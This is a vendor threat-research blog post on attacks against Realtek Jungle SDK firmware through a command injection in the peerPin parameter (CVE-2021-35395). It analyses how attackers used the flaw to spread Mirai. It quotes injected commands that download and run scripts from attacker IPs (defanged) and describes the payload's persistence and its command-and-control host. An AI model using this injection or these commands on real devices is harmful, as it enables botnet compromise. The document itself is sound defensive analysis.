			<div class="dfd-blog-title">Attacks Continue Against Realtek Vulnerabilities</div>
							<div class="entry-meta meta-bottom">
	<span class="entry-date">September 2, 2021</span>	<div class="meta-author">
	<span class="before-author">by</span>

	<span class="byline author vcard">
	<a href="https://blogs.juniper.net/author/langton" title="Posts by Asher Langton" class="author url fn" rel="author">Asher Langton</a> , <a href="https://blogs.juniper.net/author/alex" title="Posts by Alex Burt" class="author url fn" rel="author">Alex Burt</a>	</span>
	</div>

	
	</div>
			</div>
	<div class="entry-content">

		<p><img loading="lazy" class="aligncenter size-full wp-image-25503" src="https://blogs.juniper.net/wp-content/uploads/2021/09/Threat-Labs-blogs-CVE-2021-35395.gif" alt="" width="1024" height="571" /></p>
<p>As we predicted in <a href="https://blogs.juniper.net/en-us/threat-research/realtek-cve-2021-35394-exploited-in-the-wild">last week’s post</a>, threat actors continue to utilize new Realtek vulnerabilities disclosed by IoT Inspector Research Lab to distribute malware. Starting on August 19<sup>th</sup>, Juniper Threat Labs observed a new set of attacks in the wild on IoT firmware built with the Realtek SDK, this time targeting CVE-2021-35395, which was just <a href="https://www.iot-inspector.com/blog/advisory-multiple-issues-realtek-sdk-iot-supply-chain/">disclosed on August 16</a> by IoT Inspector. (Some of these attacks were previously noted in a <a href="https://securingsam.com/realtek-vulnerabilities-weaponized/">SAM Seamless Network blog post</a>.) These attacks are ongoing.</p>
<h2>The Attack</h2>
<p>The vulnerabilities in CVE-2021-35395 affect software built with the Realtek Jungle SDK (versions v2.x up to v3.4.14B) that utilize an SDK-provided management interface over HTTP. Among these vulnerabilities is a command injection on the “formWsc” page caused by a failure to sanitize input. Upon receiving the peerPin parameter, the server copies the submitted value directly into a shell command string which is then executed:</p>
<pre style="padding-left: 80px;">"iwpriv wlan%d-vxd set_mib pin=<strong>%s</strong>"</pre>
<p>The “%s” (in bold) is replaced by the contents of peerPin. By adding a semicolon to terminate the <em>iwpriv</em> statement, it is possible to execute arbitrary commands on the device. For example, given an HTTP POST request containing “peerPin=12345;malicious_command”, the device will first execute the <em>iwpriv</em> command as expected, but will then also execute <em>malicious_command</em>.</p>
<p>In one set of observed attacks, starting on August 24<sup>th</sup>, the attackers sent POST requests similar to the following:</p>
<figure id="attachment_25501" class="thumbnail wp-caption aligncenter" style="width: 1024px"><img loading="lazy" class="size-large wp-image-25501" src="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-4.58.45-PM-1024x194.png" alt="Screenshot of first malicious POST request" width="1024" height="194" srcset="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-4.58.45-PM-1024x194.png 1024w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-4.58.45-PM-300x57.png 300w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-4.58.45-PM-768x146.png 768w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-4.58.45-PM-1536x291.png 1536w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-4.58.45-PM.png 2024w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption class="caption wp-caption-text">Figure 1. Malicious POST request exploiting CVE-2021-35395.</figcaption></figure>
<p>The injected command is:</p>
<pre style="padding-left: 80px;">wget hxxp://37[.]0.11.132/rh -O - | sh</pre>
<p>which downloads and executes a script named ‘rh’:</p>
<figure id="attachment_25502" class="thumbnail wp-caption aligncenter" style="width: 846px"><img loading="lazy" class="size-full wp-image-25502" src="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-4.56.07-PM.png" alt="Screenshot of shell script downloading and executing Mirai" width="846" height="410" srcset="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-4.56.07-PM.png 846w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-4.56.07-PM-300x145.png 300w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-4.56.07-PM-768x372.png 768w" sizes="(max-width: 846px) 100vw, 846px" /><figcaption class="caption wp-caption-text">Figure 2. Malicious script downloaded by the injected command.</figcaption></figure>
<p>This script is nearly identical to the one featured in last week’s post. The only change is that the parameter passed to the downloaded binary is “exploit.realtek.http” instead of “exploit.realtek”. When the botnet agent starts up, it opens a listening port on port 44842, and then opens a TCP connection to babaroga[.]lib (188[.]166.196.89, resolved specifically by DNS server 185[.]121.177.177) on port 53 and registers the compromised computer with the botnet, including an identifier — in this case, “exploit.realtek.http” — to indicate which attack was successful.</p>
<p>We observed another set of attacks, <a href="https://securingsam.com/realtek-vulnerabilities-weaponized/">first noted by SAM Seamless Network</a>, that also used the same proof-of-concept exploit from the initial disclosure but with a different payload:</p>
<figure id="attachment_25504" class="thumbnail wp-caption aligncenter" style="width: 1024px"><img loading="lazy" class="size-large wp-image-25504" src="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.30.06-AM-1024x144.png" alt="Screenshot of second malicious POST request" width="1024" height="144" srcset="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.30.06-AM-1024x144.png 1024w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.30.06-AM-300x42.png 300w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.30.06-AM-768x108.png 768w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.30.06-AM-1536x216.png 1536w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.30.06-AM-2048x288.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption class="caption wp-caption-text">Figure 3. Another example of a POST request exploiting CVE-2021-35395.</figcaption></figure>
<p>The injected commands in the peerPin parameter attempt to download a malicious script called lolol.sh using either wget or curl and then execute it:</p>
<pre style="padding-left: 80px;">cd /tmp;
wget hxxp://212[.]192.241.87/lolol.sh;
curl -O hxxp://212[.]192.241.87/lolol.sh;
chmod 777 lolol.sh;
sh lolol.sh;</pre>
<p>The lolol.sh script starts by deleting logs and killing a large number of named processes and services, then specifically finding and killing processes using a significant amount of CPU time:</p>
<figure id="attachment_25508" class="thumbnail wp-caption aligncenter" style="width: 639px"><img loading="lazy" class="size-large wp-image-25508" src="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.21-AM-639x1024.png" alt="lolol.sh part 1: terminating other processes" width="639" height="1024" srcset="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.21-AM-639x1024.png 639w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.21-AM-187x300.png 187w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.21-AM-768x1231.png 768w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.21-AM-958x1536.png 958w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.21-AM.png 1108w" sizes="(max-width: 639px) 100vw, 639px" /><figcaption class="caption wp-caption-text">Figure 4. lolol.sh terminating other processes on the target device.</figcaption></figure>
<p>The script then tries to download a set of malicious binaries, one for each common CPU architecture. As before, the final payload is Mirai botnet malware. Each binary is renamed to nginx (a common web server and load balancer) before the script attempts to run it. Only the binary matching the target device architecture will successfully execute, and that process will immediately rename itself to avoid being terminated the next time lolol.sh runs. (Line 60 appears to be an error in the script.)</p>
<figure id="attachment_25507" class="thumbnail wp-caption aligncenter" style="width: 1024px"><img loading="lazy" class="wp-image-25507 size-large" src="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.36-AM-1024x1020.png" alt="lolol.sh part 2: downloading and executing malware" width="1024" height="1020" srcset="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.36-AM-1024x1020.png 1024w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.36-AM-300x300.png 300w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.36-AM-150x150.png 150w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.36-AM-768x765.png 768w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.36-AM.png 1164w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption class="caption wp-caption-text">Figure 5. lolol.sh attempting to download and execute Mirai binaries.</figcaption></figure>
<p>To ensure persistence, the script downloads the latest version of lolol.sh and sets it to run every 10 minutes as a cron job.</p>
<figure id="attachment_25506" class="thumbnail wp-caption aligncenter" style="width: 1024px"><img loading="lazy" class="size-large wp-image-25506" src="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.46-AM-1024x556.png" alt="lolol.sh part 3: persistence" width="1024" height="556" srcset="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.46-AM-1024x556.png 1024w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.46-AM-300x163.png 300w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.46-AM-768x417.png 768w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.46-AM.png 1128w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption class="caption wp-caption-text">Figure 6. lolol.sh installing itself as a cron job.</figcaption></figure>
<p>Finally, the script adds firewall rules to prevent the device from being reinfected, blocking inbound connectivity to the ports to which the vulnerable server is known to bind.</p>
<figure id="attachment_25505" class="thumbnail wp-caption aligncenter" style="width: 746px"><img loading="lazy" class="size-full wp-image-25505" src="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.54-AM.png" alt="lolol.sh part 4: firewall" width="746" height="582" srcset="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.54-AM.png 746w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-11.19.54-AM-300x234.png 300w" sizes="(max-width: 746px) 100vw, 746px" /><figcaption class="caption wp-caption-text">Figure 7. lolol.sh blocking reinfection via the Linux firewall.</figcaption></figure>
<h2>Detection</h2>
<p>The malicious POST requests exploiting CVE-2021-35395 are detected by Juniper’s NGFW SRX series with IDP signature <a href="https://threatlabs.juniper.net/home/search/#/details/?sigtype=ips&amp;sigid=APP:MISC:REALTEK-JUNGLE-SDK-CI">APP:MISC:REALTEK-JUNGLE-SDK-CI</a>. The binaries and servers used in these attacks are blocked by <a href="https://www.juniper.net/us/en/products/security/advanced-threat-prevention.html">Juniper Advanced Threat Prevention</a> Cloud.</p>
<figure id="attachment_25500" class="thumbnail wp-caption aligncenter" style="width: 1004px"><img loading="lazy" class="size-full wp-image-25500" src="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-5.37.47-PM.png" alt="Screenshot of the malicious files being detected by Juniper ATP Cloud." width="1004" height="440" srcset="https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-5.37.47-PM.png 1004w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-5.37.47-PM-300x131.png 300w, https://blogs.juniper.net/wp-content/uploads/2021/09/Screen-Shot-2021-09-01-at-5.37.47-PM-768x337.png 768w" sizes="(max-width: 1004px) 100vw, 1004px" /><figcaption class="caption wp-caption-text">Figure 8. Detection of malicious binaries by Juniper ATP Cloud.</figcaption></figure>
